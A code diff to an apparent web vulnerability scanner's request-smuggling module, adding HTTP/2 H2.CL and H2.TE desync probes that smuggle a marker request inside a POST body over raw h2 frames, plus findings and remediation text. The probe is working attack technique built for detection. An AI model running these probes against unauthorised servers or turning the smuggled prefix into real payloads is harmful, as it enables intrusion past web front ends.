@@ -2,7 +2,7 @@
 
 Pipeline: ambiguity pre-filter first (a server that 400-rejects dual
 Content-Length/Transfer-Encoding headers cannot be desynced this way,
-so smuggler never runs there), then a manual CL.TE desync oracle on one
+so smuggler never runs there), then manual CL.TE, TE.CL and H2.CL/H2.TE desync oracles on one
 socket (a smuggled prefix surfacing in the next response is proof),
 then smuggler's fuzzer output recorded honestly as TENTATIVE candidates
 for the ambiguous-but-unproven remainder.
@@ -23,6 +23,17 @@ from urllib.parse import urlparse
 
 from modules.base import BaseModule
 from tools.external import smuggler_scan, tool_available
+
+
+def h2_verdict(responses: dict, marker: str) -> tuple:
+    """The ghost must answer the *next* stream; stream 1 may echo it."""
+    victim = responses.get(3) or {}
+    body = victim.get("body", "") or ""
+    if marker and marker in body:
+        return True, (f"stream 3 answered the ghost path "
+                      f"(HTTP {victim.get('status', 0)})")
+    return False, (f"no marker on stream 3 "
+                   f"(HTTP {victim.get('status', 0)}, {len(body)} bytes)")
 
 
 class HTTPSmuggling(BaseModule):
@@ -55,12 +66,17 @@ class HTTPSmuggling(BaseModule):
             if not ambiguous:
                 self.log(f"  {target}: strict header handling "
                          f"({ambiguity_note}) — smuggler would be noise here")
+                if cfg.get("h2", True) and await self._h2_desync(target):
+                    confirmed += 1
                 continue
             if await self._desync_oracle(target, "cl_te"):
                 confirmed += 1
                 continue
             if cfg.get("te_cl", True) and await self._desync_oracle(
                     target, "te_cl"):
+                confirmed += 1
+                continue
+            if cfg.get("h2", True) and await self._h2_desync(target):
                 confirmed += 1
                 continue
             result = await smuggler_scan(target, timeout=300)
@@ -110,7 +126,7 @@ class HTTPSmuggling(BaseModule):
         cfg = self.config.get("modules", {}).get(self.id, {})
         return cfg if isinstance(cfg, dict) else {}
 
-    def _connection(self, url: str, timeout: int = 15):
+    def _connection(self, url: str, timeout: int = 15, alpn=None):
         """One raw connection, plain or TLS. http.client sends both
         Content-Length and Transfer-Encoding as written — no
         normalization — which is exactly what the oracle needs."""
@@ -122,8 +138,13 @@ class HTTPSmuggling(BaseModule):
             context = ssl.create_default_context()
             context.check_hostname = False
             context.verify_mode = ssl.CERT_NONE
+            if alpn:
+                context.set_alpn_protocols(list(alpn))
             raw = socket.create_connection((host, port), timeout=timeout)
             sock = context.wrap_socket(raw, server_hostname=host)
+            if alpn and sock.selected_alpn_protocol() not in alpn:
+                sock.close()
+                raise OSError("ALPN did not negotiate " + ",".join(alpn))
         else:
             sock = socket.create_connection((host, port), timeout=timeout)
         sock.settimeout(timeout)
@@ -322,6 +343,140 @@ class HTTPSmuggling(BaseModule):
             )
             self.log(f"  {label} DESYNC CONFIRMED on {target} ({note})")
         return proven
+
+    def _h2_prefix(self, mode: str, host: str, marker: str) -> str:
+        ghost = f"GET /{marker} HTTP/1.1\r\nHost: {host}\r\n\r\n"
+        if mode == "h2_te":
+            return (f"{len(ghost):x}\r\n{ghost}\r\n0\r\n\r\n")
+        return ghost
+
+    async def _h2_desync(self, target: str) -> bool:
+        """H2.CL / H2.TE: does the smuggled prefix answer the next stream?
+
+        The proof is stream-bound: the ghost path appears in stream 3's
+        response, which is the request we sent *after* the ambiguous one.
+        An echo on stream 1 (the attacker's own POST) is not counted — a
+        server is allowed to reflect a body it received without ever
+        desyncing. No ALPN h2 means this probe simply does not apply.
+        """
+        import asyncio as _asyncio
+
+        for mode in ("h2_cl", "h2_te"):
+            try:
+                proven, note = await _asyncio.wait_for(
+                    _asyncio.to_thread(self._h2_probe, target, mode),
+                    timeout=45)
+            except Exception as exc:
+                self.log(f"  {mode} probe failed for {target}: {exc}")
+                return False
+            if proven:
+                self.state.add_finding(
+                    title=f"HTTP/2 Request Desync Confirmed: {target}",
+                    severity="HIGH",
+                    confidence="CONFIRMED",
+                    category="HTTP Request Smuggling",
+                    description=(
+                        f"An HTTP/2 {mode.upper()} probe against {target} "
+                        "made the response to the next stream carry the "
+                        f"smuggled path ({note}). The H2 front end and the "
+                        "HTTP/1.1 back end disagree on request boundaries, "
+                        "so a request can be smuggled past the edge."
+                    ),
+                    evidence=[f"Target: {target}", f"Mode: {mode}",
+                              f"Oracle: {note}"],
+                    remediation=(
+                        "Reject H2 requests whose content-length does not "
+                        "match the DATA frames and strip Transfer-Encoding "
+                        "on the H2-to-HTTP/1.1 hop; normalise framing in one "
+                        "parser."
+                    ),
+                    verified=True,
+                    verification={"method": f"{mode}_desync_oracle",
+                                  "url": target},
+                )
+                self.log(f"  {mode.upper()} DESYNC CONFIRMED on {target}")
+                return True
+            if note.startswith("no h2"):
+                self.log(f"  {target}: {note}")
+                return False
+        return False
+
+    def _h2_probe(self, target: str, mode: str) -> tuple:
+        import h2.config
+        import h2.connection
+        import h2.events
+        import time
+
+        marker = f"h2ghost-{secrets.token_hex(4)}"
+        parsed = urlparse(target)
+        scheme = (parsed.scheme or "http").lower()
+        path = parsed.path or "/"
+        try:
+            sock, host = self._connection(target, timeout=15, alpn=["h2"])
+        except OSError as exc:
+            return False, f"no h2: {exc}"
+        config = h2.config.H2Configuration(
+            client_side=True, header_encoding="utf-8",
+            validate_outbound_headers=False,
+            normalize_outbound_headers=False)
+        conn = h2.connection.H2Connection(config=config)
+        responses = {1: {"status": 0, "body": ""},
+                     3: {"status": 0, "body": ""}}
+        ended = set()
+        try:
+            conn.initiate_connection()
+            sock.sendall(conn.data_to_send())
+            headers = [
+                (":method", "POST"), (":path", path),
+                (":scheme", scheme), (":authority", host),
+            ]
+            if mode == "h2_te":
+                headers.append(("transfer-encoding", "chunked"))
+            else:
+                headers.append(("content-length", "0"))
+            conn.send_headers(1, headers, end_stream=False)
+            conn.send_data(1, self._h2_prefix(mode, host, marker).encode(),
+                           end_stream=True)
+            conn.send_headers(3, [
+                (":method", "GET"), (":path", "/"),
+                (":scheme", scheme), (":authority", host),
+            ], end_stream=True)
+            sock.sendall(conn.data_to_send())
+
+            deadline = time.time() + 10
+            while time.time() < deadline and len(ended) < 2:
+                sock.settimeout(max(0.5, deadline - time.time()))
+                try:
+                    data = sock.recv(65535)
+                except (socket.timeout, OSError):
+                    break
+                if not data:
+                    break
+                for event in conn.receive_data(data):
+                    if isinstance(event, h2.events.ResponseReceived):
+                        status = dict(event.headers).get(":status")
+                        if event.stream_id in responses:
+                            responses[event.stream_id]["status"] = int(
+                                status or 0)
+                    elif isinstance(event, h2.events.DataReceived):
+                        if event.stream_id in responses:
+                            responses[event.stream_id]["body"] += \
+                                event.data.decode("utf-8", errors="replace")
+                        conn.acknowledge_received_data(
+                            event.flow_controlled_length, event.stream_id)
+                    elif isinstance(event, (h2.events.StreamEnded,
+                                            h2.events.StreamReset)):
+                        ended.add(event.stream_id)
+                pending = conn.data_to_send()
+                if pending:
+                    sock.sendall(pending)
+        finally:
+            try:
+                sock.close()
+            except OSError:
+                pass
+
+        return h2_verdict(responses, marker)
 
     def _targets(self) -> list[str]:
         targets = []
